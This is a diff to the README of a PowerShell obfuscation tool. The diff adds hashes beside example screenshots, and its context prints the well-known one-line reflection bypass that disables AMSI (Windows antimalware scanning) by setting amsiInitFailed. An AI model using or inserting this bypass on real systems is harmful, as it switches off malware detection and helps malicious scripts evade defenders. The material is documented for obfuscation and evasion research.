@@ -24,10 +24,10 @@ Example: AMSI Bypass using Using Matt Graebers Reflection method:
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
-Unmathfuscated:
+Unmathfuscated: `3f5dcf5b5cd4eb727ed4cd6cea6bbbaa8c1c5272b60c0415084981ec30e7a66b`
 ![alt text](https://raw.githubusercontent.com/bobby-tablez/Invoke-Mathfuscation/main/mathfuscate_amsi_bypass_1.png)
 
-Mathfuscated:
+Mathfuscated: `5db31b84c99d9a977e629f09b4e1f7cbd525b1167959457f6b59220e4e2eb9a5`
 ![alt text](https://raw.githubusercontent.com/bobby-tablez/Invoke-Mathfuscation/main/mathfuscate_amsi_bypass_2.png)
 
 
